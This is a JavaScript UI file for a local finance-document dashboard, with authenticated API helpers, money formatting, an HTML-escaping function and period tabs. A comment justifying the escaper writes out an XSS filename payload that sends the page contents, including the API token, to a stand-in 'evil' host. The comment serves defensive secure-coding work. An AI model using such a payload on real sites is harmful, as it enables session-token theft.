// TOKEN is set by the inline script in ui.html (which gets %%TOKEN%%
// substitution). ui.js runs after that script sets it on the global scope.
const H = { Authorization: "Bearer " + TOKEN };

// If the daemon restarts, the token changes and API calls return 401.
// Auto-reload the page to pick up the new token embedded in the HTML.
function checkAuth(r) {
  if (r.status === 401) location.reload();
  return r;
}
const api = (p) => fetch(p, { headers: H }).then(checkAuth).then((r) => r.json());
const apiPost = (p, body) => fetch(p, {
  method: "POST", headers: { ...H, "content-type": "application/json" },
  body: JSON.stringify(body || {}),
}).then(checkAuth).then((r) => r.json());
const apiPatch = (p, body) => fetch(p, {
  method: "PATCH", headers: { ...H, "content-type": "application/json" },
  body: JSON.stringify(body || {}),
}).then(checkAuth).then((r) => r.json());
const apiDelete = (p) => fetch(p, { method: "DELETE", headers: H }).then(checkAuth).then((r) => r.json());

const money = (m) => m === null || m === undefined ? "—"
  : "₹" + (m / 100).toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ",");
const clock = () => new Date().toTimeString().slice(0, 8);
const ago = (iso) => {
  if (!iso) return "—";
  const s = Math.max(0, Math.round((Date.now() - Date.parse(iso)) / 1000));
  if (s < 60) return s + "s";
  if (s < 3600) return Math.round(s / 60) + "m";
  if (s < 86400) return Math.round(s / 3600) + "h";
  return Math.round(s / 86400) + "d";
};

/**
 * Escape API- and event-derived values before they reach an innerHTML sink.
 *
 * This is not theoretical: attachment filenames come from email headers, flow
 * through intake into `documents.original_filename`, and are rendered in the
 * transaction list, the evidence card, and the live feed. Anyone who can email
 * the vault address could otherwise name a file
 * `<img src=x onerror=fetch('//evil/'+document.body.innerHTML)>` and exfiltrate
 * the page — which, on this page, includes the API session token.
 *
 * Quotes are escaped too because several values land inside single-quoted
 * attributes (data-id, class), where &apos; alone would let an attacker close
 * the attribute.
 */
const esc = (v) => v === null || v === undefined ? "" : String(v)
  .replace(/&/g, "&amp;")
  .replace(/</g, "&lt;")
  .replace(/>/g, "&gt;")
  .replace(/"/g, "&quot;")
  .replace(/'/g, "&#39;");

// ── tab navigation ───────────────────────────────────────────────
let activeTab = localStorage.getItem("q2av_tab") || "obs";

// ── period selector (shared by Dashboard and Documents Browser) ──
let selected = null;
let period = localStorage.getItem("q2av_period") || "this_fy";
const PERIODS = [
  { key: "this_month", label: "This Month" },
  { key: "last_month", label: "Last month" },
  { key: "this_fy", label: "This FY" },
  { key: "last_fy", label: "Last FY" },
  { key: "all", label: "All time" },
];
function renderPeriods() {
  const el = document.getElementById("periods");
  el.innerHTML = PERIODS.map((p) =>
    "<button class='" + (p.key === period ? "on" : "") + "' data-p='" + esc(p.key) + "'>"
    + esc(p.label) + "</button>").join("");
  el.querySelectorAll("button").forEach((b) =>
    b.onclick = () => { period = b.dataset.p; localStorage.setItem("q2av_period", period); renderPeriods(); refreshObs(); });
  // Keep the Documents Browser period selector in sync — same shared state.
  const er = document.getElementById("periodsReview");
  if (er) renderPeriodsReview();
}

// Documents Browser shares the same period selector and localStorage key as
// the Dashboard, so changing it on one tab is reflected on the other.
function renderPeriodsReview() {
  const el = document.getElementById("periodsReview");
  if (!el) return;
  el.innerHTML = PERIODS.map((p) =>
    "<button class='" + (p.key === period ? "on" : "") + "' data-p='" + esc(p.key) + "'>"
    + esc(p.label) + "</button>").join("");
  el.querySelectorAll("button").forEach((b) =>
    b.onclick = () => { period = b.dataset.p; localStorage.setItem("q2av_period", period); renderPeriods(); renderPeriodsReview(); loadReview(); });
}
